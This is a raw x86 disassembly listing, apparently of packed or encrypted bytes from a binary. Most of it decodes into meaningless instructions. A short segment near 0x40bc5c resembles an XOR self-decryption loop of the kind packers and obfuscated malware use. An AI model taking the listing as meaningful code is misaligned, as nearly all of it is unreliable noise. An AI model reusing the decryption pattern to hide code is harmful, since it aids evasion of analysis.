  40b7dc:	call   0xcf03:0x4b5d2ff
  40b7e3:	loope  0x40b851
  40b7e5:	aad    0x22
  40b7e7:	mov    ch,BYTE PTR [eax+0x6c]
  40b7ea:	ins    BYTE PTR es:[edi],dx
  40b7eb:	inc    esp
  40b7ec:	jne    0x40b77f
  40b7ee:	jns    0x40b843
  40b7f0:	fiadd  WORD PTR [ecx-0x72]
  40b7f3:	data16 hlt 
  40b7f5:	neg    WORD PTR [esi]
  40b7f8:	test   al,0x60
  40b7fa:	fild   WORD PTR [ebx-0xba6b18e]
  40b800:	inc    esi
  40b801:	xchg   edx,eax
  40b802:	mov    al,ds:0x5d3df02a
  40b807:	push   0x9284010a
  40b80c:	cmp    ecx,edx
  40b80e:	sbb    eax,0x7e655e64
  40b813:	cmp    bh,ch
  40b815:	aaa    
  40b816:	cmp    BYTE PTR [edi],dl
  40b818:	bound  edi,QWORD PTR [ebp+0x70]
  40b81b:	dec    edx
  40b81c:	mov    ds:0x2c8c3fa8,al
  40b821:	add    al,0xc4
  40b823:	popf   
  40b824:	cwde   
  40b825:	pop    eax
  40b826:	mov    edi,0x8fb51b2a
  40b82b:	js     0x40b7d6
  40b82d:	out    dx,eax
  40b82e:	fadd   DWORD PTR [eax]
  40b830:	lods   al,BYTE PTR ds:[esi]
  40b831:	dec    ebp
  40b832:	ss inc eax
  40b834:	ret    
  40b835:	mov    al,0x17
  40b837:	xor    al,0x67
  40b839:	push   ebp
  40b83a:	(bad)  
  40b83b:	cld    
  40b83c:	outs   dx,BYTE PTR ds:[esi]
  40b83d:	jmp    0x40b88b
  40b83f:	fs jmp 0x40b7c9
  40b842:	and    al,bh
  40b844:	gs push cs
  40b846:	out    0x36,al
  40b848:	in     eax,dx
  40b849:	jecxz  0x40b868
  40b84b:	fbld   TBYTE PTR [esi-0x75b0fbb1]
  40b851:	push   edi
  40b852:	pop    es
  40b853:	fsubr  st,st(5)
  40b855:	cmp    DWORD PTR ds:0x9d4ef1b3,ebx
  40b85b:	inc    edx
  40b85c:	sub    al,0x36
  40b85e:	pop    ss
  40b85f:	mov    bh,0x6a
  40b861:	mov    WORD PTR ds:0x38eb026,cs
  40b867:	dec    esp
  40b868:	push   es
  40b869:	push   edx
  40b86a:	pop    edi
  40b86b:	mov    ebx,0xd1613e22
  40b870:	test   DWORD PTR [esi+0x68a32e6f],esp
  40b876:	retf   0x2860
  40b879:	push   ds
  40b87a:	and    ebp,DWORD PTR ds:0xe6e4b256
  40b880:	repz sub BYTE PTR [ebx+0x64],bh
  40b884:	inc    ecx
  40b885:	and    edx,edi
  40b887:	inc    ebp
  40b888:	dec    edi
  40b889:	jns    0x40b84e
  40b88b:	mov    edx,0x9860c5e1
  40b890:	inc    DWORD PTR [edx-0x10da1de6]
  40b896:	dec    ecx
  40b897:	pop    edi
  40b898:	call   0xf9d3fd1e
  40b89d:	sar    BYTE PTR [ebx+0x2325190e],1
  40b8a3:	mov    dh,0xa
  40b8a5:	pop    esp
  40b8a6:	sub    dl,ah
  40b8a8:	mov    eax,ds:0xf2eb9036
  40b8ad:	pop    edx
  40b8ae:	xor    BYTE PTR [esi+0x54f0d73f],bh
  40b8b4:	mov    ds:0x7c01db27,al
  40b8b9:	outs   dx,BYTE PTR ds:[esi]
  40b8ba:	cmp    al,0x45
  40b8bc:	pop    edx
  40b8bd:	call   0x8bd6122
  40b8c2:	dec    ebx
  40b8c3:	sahf   
  40b8c4:	mov    al,0x8f
  40b8c6:	aaa    
  40b8c7:	int3   
  40b8c8:	cmp    eax,0xc97f6340
  40b8cd:	lods   eax,DWORD PTR ds:[esi]
  40b8ce:	push   ebx
  40b8cf:	xor    al,0xd2
  40b8d1:	stos   BYTE PTR es:[edi],al
  40b8d2:	sub    al,0x66
  40b8d4:	sbb    al,BYTE PTR [edx-0xfe6e6eb]
  40b8da:	ds xchg esp,eax
  40b8dc:	jo     0x40b94d
  40b8de:	arpl   di,di
  40b8e0:	dec    ebx
  40b8e1:	mov    dh,0xeb
  40b8e3:	imul   ebx,DWORD PTR [ebx+0x7553bca8],0x2e
  40b8ea:	sub    al,0xba
  40b8ec:	or     ch,dl
  40b8ee:	pusha  
  40b8ef:	push   ecx
  40b8f0:	or     eax,0xd7e99d47
  40b8f5:	rcr    BYTE PTR [eax+edx*2+0x46],1
  40b8f9:	rol    BYTE PTR [edi+ebp*2],0x5f
  40b8fd:	xor    al,BYTE PTR [ecx+0x63]
  40b900:	xchg   edi,eax
  40b901:	cs sbb bl,bh
  40b904:	and    ecx,DWORD PTR [ecx]
  40b906:	cmp    al,0x86
  40b908:	jae    0x40b910
  40b90a:	je     0x40b981
  40b90c:	cdq    
  40b90d:	sub    bl,BYTE PTR [ecx-0x33630877]
  40b913:	enter  0xc63d,0xa8
  40b917:	xor    DWORD PTR [ebx+0xf],edi
  40b91a:	test   BYTE PTR [edi],ah
  40b91c:	add    eax,DWORD PTR [eax]
  40b91e:	add    BYTE PTR [ebx+0x2081f045],cl
  40b924:	sbb    BYTE PTR [esi*2-0x3451700],0xff
  40b92c:	(bad)  
  40b92d:	jmp    0x40bc46
  40b932:	into   
  40b933:	aas    
  40b934:	ds ror ebp,0xc1
  40b938:	rcl    ebx,1
  40b93a:	add    esi,DWORD PTR [edi]
  40b93c:	stos   DWORD PTR es:[edi],eax
  40b93d:	ror    ebp,cl
  40b93f:	call   0x7878:0x8cc6e7e0
  40b946:	je     0x40b9c6
  40b948:	js     0x40b9c2
  40b94a:	jmp    0x40b967
  40b94c:	xchg   ebp,eax
  40b94d:	ins    BYTE PTR es:[edi],dx
  40b94e:	and    DWORD PTR [edi+0x459d771e],ebp
  40b954:	frstor [ebx-0x67]
  40b957:	mov    al,ds:0x3a27b9d4
  40b95c:	shr    DWORD PTR [ebp+0x39608b58],0x1c
  40b963:	pop    edi
  40b964:	sub    dh,BYTE PTR [ecx+0x28]
  40b967:	cmp    al,0xe7
  40b969:	js     0x40b909
  40b96b:	std    
  40b96c:	aam    0x86
  40b96e:	(bad)  
  40b96f:	push   cs
  40b970:	pandn  mm5,QWORD PTR [ebp+0x7050a38]
  40b977:	cld    
  40b978:	(bad)  
  40b979:	test   eax,0xe9fa8f13
  40b97e:	jo     0x40b985
  40b980:	mov    esi,DWORD PTR [eax+0x37]
  40b983:	call   0x10d0:0xa40a1f1b
  40b98a:	in     al,0xc7
  40b98c:	mov    esi,0x9cce6e58
  40b991:	mov    cl,BYTE PTR [eax]
  40b993:	lock out dx,eax
  40b995:	add    eax,0x1d6c608f
  40b99a:	dec    edi
  40b99c:	lea    esp,[edx+0x51]
  40b99f:	jle    0x40b99c
  40b9a1:	frstor [edi+0x48]
  40b9a4:	bound  edi,QWORD PTR [edx+0x70632c28]
  40b9aa:	pop    esi
  40b9ab:	push   0xbf50fbc7
  40b9b0:	add    ch,BYTE PTR [ecx+0x5e164327]
  40b9b6:	mov    ds,ebx
  40b9b8:	call   0xffe75c36
  40b9bd:	aas    
  40b9be:	(bad)  [ebx]
  40b9c0:	sub    cl,BYTE PTR [ebx+0x40]
  40b9c3:	mov    al,ds:0xc06a8286
  40b9c8:	dec    eax
  40b9c9:	push   ecx
  40b9ca:	push   ebp
  40b9cb:	adc    DWORD PTR [ebx+ecx*8+0x178613df],0xffffffbc
  40b9d3:	mov    ch,0x78
  40b9d5:	stos   BYTE PTR es:[di],al
  40b9d7:	pushf  
  40b9d8:	cmp    edi,DWORD PTR [bx+di]
  40b9db:	imul   edx,DWORD PTR [edi+0x34],0x79
  40b9df:	and    BYTE PTR [edi],ah
  40b9e1:	and    BYTE PTR [esi+eiz*8-0x69dfe6b0],al
  40b9e8:	adc    BYTE PTR [ecx+0x25],cl
  40b9eb:	push   es
  40b9ec:	(bad)  
  40b9ed:	jb     0x40b9b3
  40b9ef:	adc    eax,0xd5915e1f
  40b9f4:	xor    eax,0xa70b5044
  40b9f9:	fwait
  40b9fa:	xchg   ebx,eax
  40b9fb:	test   eax,0x2f95082e
  40ba00:	popa   
  40ba01:	mov    ds:0xcc8528b8,al
  40ba06:	mov    ebx,DWORD PTR [edi]
  40ba08:	or     ebp,DWORD PTR [ebp-0x7e]
  40ba0b:	lods   al,BYTE PTR ds:[esi]
  40ba0c:	dec    ebp
  40ba0d:	pop    ebx
  40ba0e:	retf   
  40ba0f:	sbb    edi,DWORD PTR [eax]
  40ba11:	add    BYTE PTR [ecx-0x60],al
  40ba14:	add    ch,BYTE PTR [esi+ebp*4-0x6ab923c5]
  40ba1b:	jge    0x40b9f5
  40ba1d:	inc    ecx
  40ba1e:	adc    BYTE PTR [esi-0x1b346acf],dl
  40ba24:	sub    DWORD PTR [ebx+0x2a],0x7c
  40ba28:	jmp    0x7778:0xbd60ae84
  40ba2f:	xchg   DWORD PTR [esi],esi
  40ba31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba32:	pop    sp
  40ba34:	adc    edi,ebx
  40ba36:	lods   al,BYTE PTR ds:[esi]
  40ba37:	js     0x40ba50
  40ba39:	call   0x256f:0xdd824ce1
  40ba40:	xchg   ebp,eax
  40ba41:	pop    esi
  40ba42:	lods   eax,DWORD PTR ds:[esi]
  40ba43:	jno    0x40ba3d
  40ba45:	mov    ecx,0x9de3d9ae
  40ba4a:	jl     0x40ba71
  40ba4c:	and    eax,0x13ff8cd2
  40ba51:	add    eax,0xc8dcb341
  40ba56:	push   cs
  40ba57:	(bad)  
  40ba58:	or     esi,DWORD PTR [esi-0x1cdd7a4b]
  40ba5e:	jmp    0x601f:0x34666ace
  40ba65:	cmp    ebx,DWORD PTR [edx+0x49]
  40ba68:	imul   edi,DWORD PTR [ecx-0x5ca0fe98],0x95ee1e96
  40ba72:	retf   0x3922
  40ba75:	clc    
  40ba76:	fstp   DWORD PTR [edx]
  40ba78:	hlt    
  40ba79:	rcl    BYTE PTR [ebx-0xf],1
  40ba7c:	cmp    al,0xbb
  40ba7e:	xchg   esi,eax
  40ba7f:	call   FWORD PTR [edi+0x6d5e1f76]
  40ba85:	add    ebp,eax
  40ba87:	ret    0x8225
  40ba8a:	inc    esi
  40ba8b:	data16 cli 
  40ba8d:	xchg   edx,eax
  40ba8e:	je     0x40baa3
  40ba90:	test   edx,ebp
  40ba92:	push   ebx
  40ba93:	ret    
  40ba94:	call   0x30277bd8
  40ba99:	mov    dh,0x9e
  40ba9b:	into   
  40ba9c:	sub    edx,DWORD PTR [edi]
  40ba9e:	add    eax,ebx
  40baa0:	stos   BYTE PTR es:[edi],al
  40baa1:	push   ss
  40baa2:	in     al,0x95
  40baa4:	mov    ebp,0x8fae2d5d
  40baa9:	in     al,0xd3
  40baab:	jge    0x40bb2c
  40baad:	and    eax,DWORD PTR [edi+0x2608097f]
  40bab3:	cmp    DWORD PTR [esi+0x62],esi
  40bab6:	sti    
  40bab7:	jle    0x40ba4f
  40bab9:	xor    eax,0x9100878
  40babe:	add    eax,0xf5580777
  40bac3:	mov    ebx,DWORD PTR ds:0xdea41703
  40bac9:	jmp    0x7565f154
  40bace:	in     al,dx
  40bacf:	cmp    eax,0x8c9a2012
  40bad4:	popf   
  40bad5:	lea    ebx,[edx+0x75]
  40bad8:	out    dx,eax
  40bad9:	xchg   edi,eax
  40bada:	pushf  
  40badb:	sub    DWORD PTR [eax-0x37a5edd6],esi
  40bae1:	dec    esp
  40bae2:	in     al,0x27
  40bae4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bae5:	jne    0x40bace
  40bae7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bae8:	jmp    0x3426f1f8
  40baed:	xor    eax,DWORD PTR [edi+0x34fd6db6]
  40baf3:	mov    edx,ebx
  40baf5:	ja     0x40bb4c
  40baf7:	or     BYTE PTR [edx+0x46],bh
  40bafa:	inc    edx
  40bafb:	add    al,0x33
  40bafd:	push   ds
  40bafe:	push   edi
  40baff:	inc    esp
  40bb00:	ltr    dx
  40bb03:	dec    edi
  40bb04:	pop    esp
  40bb05:	jbe    0x40bb01
  40bb07:	int    0x6d
  40bb09:	dec    ecx
  40bb0a:	inc    eax
  40bb0b:	loopne 0x40bb70
  40bb0d:	imul   ebx,ebp,0x24
  40bb10:	xor    edi,DWORD PTR [edi+0x22]
  40bb13:	mov    bl,0xf3
  40bb15:	clc    
  40bb16:	push   ebp
  40bb17:	fcmovne st,st(0)
  40bb19:	mov    ebp,0x4d83440b
  40bb1e:	repz and BYTE PTR ds:0x4e46eb25,ch
  40bb25:	call   0xe5b9:0x95d2fbac
  40bb2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb2d:	jo     0x40bba1
  40bb2f:	(bad)  
  40bb30:	jecxz  0x40bb88
  40bb32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb33:	data16 stos BYTE PTR es:[edi],al
  40bb35:	push   ds
  40bb36:	pop    ecx
  40bb37:	cli    
  40bb38:	jle    0x40baca
  40bb3a:	dec    edi
  40bb3b:	nop
  40bb3c:	mov    dh,0xcd
  40bb3e:	sbb    ebp,DWORD PTR [edx-0x65e0ec7a]
  40bb44:	aam    0xec
  40bb46:	(bad)  
  40bb47:	cmp    BYTE PTR [edx+ebx*4-0x15],dl
  40bb4b:	push   0x27
  40bb4d:	scas   eax,DWORD PTR es:[edi]
  40bb4e:	and    BYTE PTR [ebx-0x50],dl
  40bb51:	cdq    
  40bb52:	nop
  40bb53:	adc    esi,DWORD PTR [ecx]
  40bb55:	inc    eax
  40bb57:	push   ss
  40bb58:	dec    esp
  40bb59:	add    eax,0x2ca7f4eb
  40bb5e:	jl     0x40bb07
  40bb60:	popa   
  40bb61:	fwait
  40bb62:	mov    ds:0x34a692ba,eax
  40bb67:	adc    ebp,esi
  40bb69:	or     al,0x45
  40bb6b:	mov    ds:0x46b6cc72,al
  40bb70:	or     al,bl
  40bb72:	cli    
  40bb73:	xchg   ebx,eax
  40bb74:	mov    dl,0xa0
  40bb76:	mov    ch,0x51
  40bb78:	(bad)  
  40bb7a:	aaa    
  40bb7b:	mov    eax,0xc45a858
  40bb80:	cmp    ebp,esp
  40bb82:	(bad)  
  40bb83:	fist   DWORD PTR [esi]
  40bb85:	pop    esi
  40bb86:	adc    DWORD PTR [ecx-0x26819ce],edi
  40bb8c:	jns    0x40bbf9
  40bb8e:	sbb    BYTE PTR [edi+ebp*1+0x6b],ah
  40bb92:	in     eax,dx
  40bb93:	mov    ecx,0x82954199
  40bb98:	ja     0x40bbdb
  40bb9a:	jo     0x40bb2b
  40bb9c:	repz adc edi,DWORD PTR [edi]
  40bb9f:	inc    esi
  40bba0:	addr16 int 0x27
  40bba3:	nop
  40bba4:	(bad)  
  40bba5:	jmp    0x40bb52
  40bba7:	aaa    
  40bba8:	test   al,0x31
  40bbaa:	(bad)  
  40bbab:	outs   dx,BYTE PTR ds:[esi]
  40bbac:	or     al,0xee
  40bbae:	mov    edx,0xd5a8e518
  40bbb3:	cmp    esp,DWORD PTR [edi+0xb50ce5f]
  40bbb9:	(bad)  [ecx+eiz*1-0x11]
  40bbbd:	loope  0x40bb74
  40bbbf:	add    al,0x70
  40bbc1:	nop
  40bbc2:	mov    ?,WORD PTR ds:0x5bbb0708
  40bbc8:	test   eax,0x15e8e802
  40bbcd:	scas   ax,WORD PTR es:[edi]
  40bbcf:	xor    ah,BYTE PTR [esi]
  40bbd1:	pop    edi
  40bbd2:	add    eax,0x7dcd4268
  40bbd7:	adc    bl,BYTE PTR [ebx]
  40bbd9:	dec    ecx
  40bbda:	add    DWORD PTR [ecx-0x780ba5c7],edi
  40bbe0:	jo     0x40bb81
  40bbe2:	dec    esp
  40bbe3:	lods   al,BYTE PTR ds:[esi]
  40bbe4:	hlt    
  40bbe5:	push   ds
  40bbe6:	jbe    0x40bc2e
  40bbe8:	inc    esi
  40bbe9:	jge    0x40bbba
  40bbeb:	mov    bl,0x27
  40bbed:	dec    esp
  40bbee:	jno    0x40bbd8
  40bbf0:	fs pop edx
  40bbf2:	sahf   
  40bbf3:	mov    eax,ds:0x9d5b0a2c
  40bbf8:	retf   0xdbbc
  40bbfb:	or     dh,BYTE PTR [ebx-0x37]
  40bbfe:	rcr    BYTE PTR [ebp+0x2a31a461],1
  40bc04:	cld    
  40bc05:	mov    ecx,0x8c9ac7ce
  40bc0a:	or     DWORD PTR [ecx-0x1b],esi
  40bc0d:	dec    eax
  40bc0e:	loope  0x40bc68
  40bc10:	xor    eax,0x5f5a8806
  40bc15:	cmp    ebx,DWORD PTR [eax*1-0x4b243347]
  40bc1c:	add    eax,0xbf2106cd
  40bc21:	inc    eax
  40bc22:	mov    eax,ds:0x22608cff
  40bc27:	aaa    
  40bc28:	jmp    0xc1e2e719
  40bc2d:	fstp   TBYTE PTR [esi+eiz*8-0x5b]
  40bc31:	call   0xa962:0x8994cb64
  40bc38:	sbb    DWORD PTR [esi],ebx
  40bc3a:	add    al,0x20
  40bc3c:	mov    edx,0x1f33cf89
  40bc41:	pop    edi
  40bc42:	pop    esp
  40bc43:	jae    0x40bcc4
  40bc45:	pop    ds
  40bc46:	mov    eax,DWORD PTR [ebp-0xc]
  40bc49:	mov    edx,DWORD PTR [ebp-0x18]
  40bc4c:	or     eax,edx
  40bc4e:	cmp    eax,0xfa9f7e76
  40bc53:	je     0x40bc67
  40bc59:	mov    eax,DWORD PTR [ebp-0x10]
  40bc5c:	xor    DWORD PTR [eax],0x2650fa8e
  40bc62:	jmp    0x40b5e7
  40bc67:	mov    ax,WORD PTR [ebp-0x4]
  40bc6b:	jmp    0x40bf84
  40bc70:	(bad)  
  40bc71:	ds ret 
  40bc73:	ror    bl,cl
  40bc75:	rcl    ebp,1
  40bc77:	fisubr DWORD PTR [ebp+0x56]
  40bc7a:	xchg   esp,eax
  40bc7b:	jge    0x40bc25
  40bc7d:	fild   QWORD PTR [ecx+0x18]
  40bc80:	ret    0x7891
  40bc83:	js     0x40bcf9
  40bc85:	jle    0x40bcff
  40bc87:	js     0x40bc91
  40bc89:	sbb    DWORD PTR ds:0x8d1aa7ed,esi
  40bc8f:	mov    eax,0x71fe64f
  40bc94:	out    dx,al
  40bc95:	mov    ds:0xa3b81bbc,eax
  40bc9a:	mov    al,ds:0x30760305
  40bc9f:	push   ebp
  40bca0:	pusha  
  40bca1:	sbb    BYTE PTR [esi-0x4],0x9f
  40bca5:	xor    al,0xc7
  40bca7:	inc    ebp
  40bca8:	jns    0x40bd0d
  40bcaa:	mov    edx,0x7b8c20f4
  40bcaf:	mov    ebx,0x2c5c0337
  40bcb4:	jmp    0xe2e2d6ad
  40bcb9:	shr    DWORD PTR [edi],1
  40bcbb:	sbb    edi,DWORD PTR [eax+esi*1]
  40bcbe:	add    al,0xd7
  40bcc0:	stc    
  40bcc1:	fwait
  40bcc2:	xchg   ebx,eax
  40bcc3:	cwde   
  40bcc4:	xchg   esi,eax
  40bcc5:	inc    edx
  40bcc6:	cmp    al,dh
  40bcc8:	xchg   esp,eax
  40bcc9:	xor    DWORD PTR ds:[eax+0x2bb275cc],esp
  40bcd0:	sbb    DWORD PTR [eax+0x76],ebp
  40bcd3:	adc    edx,esi
  40bcd5:	sub    al,0xc5
  40bcd7:	shl    BYTE PTR [edx+ebp*4+0x39],0x81
  40bcdc:	dec    ecx
  40bcdd:	or     BYTE PTR [ebp+0x2c],dh
  40bce0:	fsub   DWORD PTR [esi-0x53c01031]
  40bce6:	pop    eax
  40bce8:	jnp    0x40bd01
  40bcea:	inc    esp
  40bceb:	iret   
  40bcec:	loope  0x40bd11
  40bcee:	push   ecx
  40bcef:	(bad)  
  40bcf0:	fsubr  DWORD PTR [ecx-0x72]
  40bcf3:	rol    cl,1
  40bcf5:	test   esp,edi
  40bcf7:	cld    
  40bcf8:	sub    DWORD PTR [esi+edi*2],esp
  40bcfb:	pop    ds
  40bcfc:	inc    edi
  40bcfd:	cmc    
  40bcfe:	xor    eax,0x78359d99
  40bd03:	xchg   DWORD PTR [esi+0x40],edi
  40bd06:	push   ebx
  40bd07:	xchg   ecx,eax
  40bd08:	push   cs
  40bd09:	in     eax,0xae
  40bd0b:	out    dx,al
  40bd0c:	mov    edi,0xd744dec5
  40bd11:	and    ebp,DWORD PTR [esi+edi*4]
  40bd14:	dec    esp
  40bd15:	xchg   ecx,eax
  40bd16:	sub    DWORD PTR ds:0x4dc0f893,esp
  40bd1c:	pop    ebx
  40bd1d:	adc    al,0x9f
  40bd1f:	or     al,0x1e
  40bd21:	push   ds
  40bd22:	mov    cl,0x77
  40bd24:	push   ds
  40bd25:	xchg   BYTE PTR [esi+ebp*1-0x69],ch
  40bd29:	jae    0x40bd2c
  40bd2b:	push   0x31d52b23
  40bd30:	cmp    BYTE PTR [eax+esi*2-0x48],ch
  40bd34:	add    DWORD PTR [eax],0x1c82ed77
  40bd3a:	jae    0x40bd0f
  40bd3c:	or     al,0x75
  40bd3e:	add    ah,BYTE PTR [esi]
  40bd40:	ds or  cl,ah
  40bd43:	call   0x9f5763f
  40bd48:	inc    esp
  40bd49:	mov    WORD PTR [esp+esi*2],ds
  40bd4c:	pop    es
  40bd4d:	adc    ebp,ebp
  40bd4f:	dec    esi
  40bd50:	int3   
  40bd51:	mov    eax,0x556cd71a
  40bd56:	arpl   WORD PTR [eax],di
  40bd58:	mov    eax,ds:0x17ca6da8
  40bd5d:	mov    ah,al
  40bd5f:	addr16 jp 0x40bd8d
  40bd62:	popf   
  40bd63:	(bad)  
  40bd64:	pop    eax
  40bd65:	imul   edx,DWORD PTR [edi+0x1d452ed],0xafde257c
  40bd6f:	adc    eax,0xd6b841e8
  40bd74:	adc    ch,BYTE PTR ds:0xe39d8b93
  40bd7a:	or     BYTE PTR [edx-0x28],ah
  40bd7d:	adc    esi,eax
  40bd7f:	dec    ecx
  40bd80:	push   0x4b
  40bd82:	lods   al,BYTE PTR ds:[esi]
  40bd83:	(bad)  
  40bd84:	arpl   WORD PTR [esi],sp
  40bd86:	retf   
  40bd87:	cld    
  40bd88:	test   ah,cl
  40bd8a:	xchg   ebx,eax
  40bd8b:	xchg   edx,eax
  40bd8c:	pop    ebx
  40bd8d:	in     al,dx
  40bd8e:	inc    edx
  40bd8f:	jnp    0x40bdb1
  40bd91:	rol    DWORD PTR [edi-0x3b0d37c],1
  40bd97:	mov    dl,0x76
  40bd99:	fsubr  st(5),st
  40bd9b:	fcmovnbe st,st(0)
  40bd9d:	ret    
  40bd9e:	vpsubsb xmm6,xmm3,xmm2
  40bda2:	rcr    DWORD PTR [edi],0xf6
  40bda5:	rcr    BYTE PTR [ecx+0x59a04eaf],0x92
  40bdac:	cmp    cl,BYTE PTR [esi-0x47659ece]
  40bdb2:	cmp    DWORD PTR [ebx-0x7e],ebp
  40bdb5:	pop    eax
  40bdb6:	call   0x845b8d4d
  40bdbb:	daa    
  40bdbc:	outs   dx,BYTE PTR ds:[esi]
  40bdbd:	test   ch,bl
  40bdbf:	xchg   edi,eax
  40bdc0:	jp     0x40bdfb
  40bdc2:	mov    bl,0x6a
  40bdc4:	das    
  40bdc5:	pop    esi
  40bdc6:	outs   dx,DWORD PTR ds:[esi]
  40bdc7:	mov    ds:0x6c0b593b,eax
  40bdcc:	sbb    ch,ah
  40bdce:	cmp    BYTE PTR [edx+esi*2-0x4ff08cca],bh
  40bdd5:	mov    eax,ds:0x3aa4b868
  40bdda:	xchg   edi,eax
  40bddb:	in     al,dx
  40bddc:	jp     0x40bdd8
  40bdde:	ins    DWORD PTR es:[edi],dx
  40bddf:	or     BYTE PTR [ebx],ch
  40bde1:	mov    DWORD PTR [edi-0x2d0f45e2],0x125fcc42
  40bdeb:	in     eax,0x2e
  40bded:	les    ecx,FWORD PTR [eax+0x26]
  40bdf0:	out    dx,al
  40bdf1:	pop    ebp
  40bdf2:	xchg   edi,eax
  40bdf3:	mov    bh,0x77
  40bdf5:	cld    
  40bdf6:	jmp    0x40bde0
  40bdf8:	ficomp DWORD PTR [ecx+0x4fe3a12]
  40bdfe:	addr16 test ah,bl
  40be01:	pusha  
  40be02:	push   eax
  40be03:	sahf   
  40be04:	mov    eax,0x797b9f84
  40be09:	push   ds
  40be0a:	clc    
  40be0b:	aas    
  40be0c:	push   esp
  40be0d:	stc    
  40be0e:	pop    ecx
  40be0f:	mov    eax,ds:0x386f840
  40be14:	and    al,bl
  40be16:	imul   esi,eax,0x29
  40be19:	cmp    ecx,DWORD PTR [ebx]
  40be1b:	mov    ebp,DWORD PTR [ecx-0x52]
  40be1e:	xor    BYTE PTR [eax],0xa9
  40be21:	push   esp
  40be22:	mov    ch,0xdb
  40be24:	fisubr DWORD PTR [edi-0x6356e15c]
  40be2a:	neg    BYTE PTR [ebp-0x4e738275]
  40be30:	repz in eax,dx
  40be32:	call   0xb65a9eea
  40be37:	hlt    
  40be38:	shl    BYTE PTR [ecx],0x70
  40be3b:	mov    ebx,0xe3dac67c
  40be40:	inc    ecx
  40be41:	cwde   
  40be42:	push   esi
  40be43:	add    DWORD PTR [eax-0xb4f25a8],0xdaf8d15a
  40be4d:	(bad)  
  40be4e:	nop
  40be4f:	mov    eax,ds:0xe1e22f3d
  40be54:	dec    eax
  40be55:	retf   0x9bbf
  40be58:	bound  esi,QWORD PTR [ebx]
  40be5a:	mov    dl,0x4a
  40be5c:	lods   eax,DWORD PTR ds:[esi]
  40be5d:	inc    esi
  40be5e:	mov    al,ds:0x65dc1213
  40be63:	(bad)  
  40be64:	cmp    eax,0xca81b395
  40be69:	stc    
  40be6a:	mov    WORD PTR [esi+0x7b74e51c],ss
  40be70:	sbb    eax,0x6292319
  40be75:	jo     0x40be30
  40be77:	mov    dh,0x4c
  40be79:	xchg   edx,eax
  40be7a:	pop    ebp
  40be7b:	(bad)  
  40be7c:	gs sub ebp,ebp
  40be7f:	int3   
  40be80:	stos   DWORD PTR es:[edi],eax
  40be81:	push   0xffffffba
  40be83:	(bad)  
  40be84:	aam    0x8a
  40be86:	leave  
  40be87:	mov    ebp,0xb1b6c9bf
  40be8c:	pop    es
  40be8d:	sub    eax,0x49e1707e
  40be92:	and    BYTE PTR [ebp-0x62],bh
  40be95:	pop    edx
  40be96:	daa    
  40be97:	jns    0x40be6c
  40be99:	sub    ebp,DWORD PTR [edx]
  40be9b:	xor    eax,0x1ddda995
  40bea0:	jg     0x40bed3
  40bea2:	shl    DWORD PTR [eax+0x77b7c887],1
  40bea8:	cld    
  40bea9:	push   eax
  40beaa:	ins    DWORD PTR es:[edi],dx
  40beab:	pushf  
  40beac:	(bad)  ds:[edi-0x74ffecca]
  40beb3:	adc    esi,DWORD PTR [ecx+0x3a]
  40beb6:	push   0xffffffad
  40beb8:	fistp  QWORD PTR [ecx-0x12]
  40bebb:	jb     0x40be8e
  40bebd:	mov    DWORD PTR [ecx],0xf3e22948
  40bec3:	pop    ss
  40bec4:	mov    BYTE PTR [ecx-0x54],dh
  40bec7:	inc    esp
  40bec8:	imul   edi,DWORD PTR [ebx+0x10],0x48c206c5
  40becf:	ins    DWORD PTR es:[edi],dx
  40bed0:	aas    
  40bed1:	add    eax,0x1a59f679
  40bed6:	xchg   ecx,eax
  40bed7:	(bad)  
  40bed8:	repz dec esi
  40beda:	xchg   esp,eax
  40bedb:	stc    
  40bedc:	xchg   DWORD PTR [edi],esi
  40bede:	dec    edx
  40bedf:	jae    0x40bea7
  40bee1:	xchg   edi,eax
  40bee2:	xchg   DWORD PTR [eax+0x6a3a2839],edi
  40bee8:	xchg   esp,eax
  40bee9:	mov    ecx,0xc3e81452
  40beee:	push   ebp
  40beef:	xchg   esp,eax
  40bef0:	mov    dh,0x42
  40bef2:	mov    eax,0x7075287c
  40bef7:	xchg   edx,eax
  40bef8:	inc    ebx
  40bef9:	retf   
  40befa:	sub    eax,0x1e66ccd5
  40beff:	fwait
  40bf00:	cli    
  40bf01:	sub    ebp,edi
  40bf03:	clc    
  40bf04:	and    cl,BYTE PTR [edi+0x20549070]
  40bf0a:	adc    al,0xc1
  40bf0c:	xor    bh,al
  40bf0e:	push   ebx
  40bf0f:	popa   
  40bf10:	inc    edx
  40bf11:	out    dx,al
  40bf12:	pop    ss
  40bf13:	neg    DWORD PTR [ecx]
  40bf15:	or     dl,BYTE PTR [edi]
  40bf17:	jp     0x40bebf
  40bf19:	xchg   esp,eax
  40bf1a:	jg     0x40bf27
  40bf1c:	aad    0x12
  40bf1e:	or     ah,BYTE PTR [edx]
  40bf20:	aam    0x3a
  40bf22:	(bad)  
  40bf23:	mov    esp,0xb85c9626
  40bf28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf29:	jbe    0x40beb3
  40bf2b:	cli    
  40bf2c:	inc    esi
  40bf2d:	sub    DWORD PTR [eax-0x54],esi
  40bf30:	out    dx,al
  40bf31:	add    al,0xa1
  40bf33:	dec    edi
  40bf34:	dec    ebx
  40bf35:	mov    ah,0x1b
  40bf37:	sbb    al,0xe1
  40bf39:	repnz repnz enter 0xa6e4,0x22
  40bf3f:	fld    TBYTE PTR [eax-0xc7f0551]
  40bf45:	push   ss
  40bf46:	mov    esp,0x8aaffdf3
  40bf4b:	cmp    dl,cl
  40bf4d:	scas   eax,DWORD PTR es:[edi]
  40bf4e:	jne    0x40bf7f
  40bf50:	(bad)  
  40bf51:	jmp    0x40bf3c
  40bf53:	sbb    cl,BYTE PTR [ebx]
  40bf55:	xchg   esi,eax
  40bf56:	add    esi,DWORD PTR [ecx+edx*1-0x21]
  40bf5a:	cmp    al,0x8a
  40bf5c:	cwde   
  40bf5d:	adc    al,0xf2
  40bf5f:	xlat   BYTE PTR ds:[ebx]
  40bf60:	in     al,0x55
  40bf62:	mov    ebp,0xef637266
  40bf67:	scas   al,BYTE PTR es:[edi]
  40bf68:	jo     0x40bf7d
  40bf6a:	mov    esp,DWORD PTR [eax-0x211654fc]
